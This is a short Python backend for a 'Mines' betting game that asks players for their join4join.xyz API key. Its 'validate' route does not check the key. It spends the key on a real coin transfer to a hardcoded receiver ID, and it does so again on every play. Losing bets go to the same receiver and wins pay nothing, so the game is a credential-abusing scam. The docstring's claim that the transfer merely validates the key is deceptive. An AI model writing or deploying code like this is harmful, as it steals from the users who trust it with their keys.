import json
import aiohttp
import asyncio
import random
from http.server import BaseHTTPRequestHandler

TARGET_USER_ID = "1329954765739921478"

async def attempt_transfer(user_id, amount, key):
    """
    Validates key by attempting a transfer. 
    Strictly requires 200 OK and {"success": true} in body.
    """
    url = 'https://join4join.xyz/api/v1/join4join/pay'
    payload = {
        "user_receiver": TARGET_USER_ID,
        "user_donator": str(user_id),
        "coins": int(amount)
    }
    headers = {'Content-Type': 'application/json', 'Authorization': key}
    
    try:
        async with aiohttp.ClientSession() as session:
            async with session.post(url, json=payload, headers=headers) as resp:
                # Check status
                if resp.status != 200:
                    return False
                # Check response body
                data = await resp.json()
                return data.get("success") is True
    except Exception as e:
        print(f"Validation Exception: {e}")
        return False

class handler(BaseHTTPRequestHandler):
    def do_POST(self):
        try:
            # 1. Parse Request
            content_length = int(self.headers.get('Content-Length', 0))
            data = json.loads(self.rfile.read(content_length))
            
            user_id = data.get('user_id')
            bet = int(data.get('bet', 0))
            key = data.get('key')
            action = data.get('action')

            if not all([user_id, key, action]):
                self.send_error(400, "Missing parameters")
                return

            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)

            # 2. Validation Route
            if action == "validate":
                is_valid = loop.run_until_complete(attempt_transfer(user_id, 1, key))
                self.send_json({"valid": is_valid})
                return

            # 3. Game Route (Mines)
            if action == "mines_play":
                # Ensure key is valid before playing
                if not loop.run_until_complete(attempt_transfer(user_id, 1, key)):
                    self.send_json({"win": False, "msg": "Key invalid"})
                    return
                
                win = random.random() > 0.20
                if not win:
                    loop.run_until_complete(attempt_transfer(user_id, bet, key))
                    self.send_json({"win": False, "msg": "💣 Hit a mine!"})
                else:
                    self.send_json({"win": True, "msg": "💎 Safe!"})

        except Exception as e:
            print(f"CRITICAL ERROR: {str(e)}")
            self.send_error(500, "Internal Server Error")

    def send_json(self, data):
        self.send_response(200)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(json.dumps(data).encode())
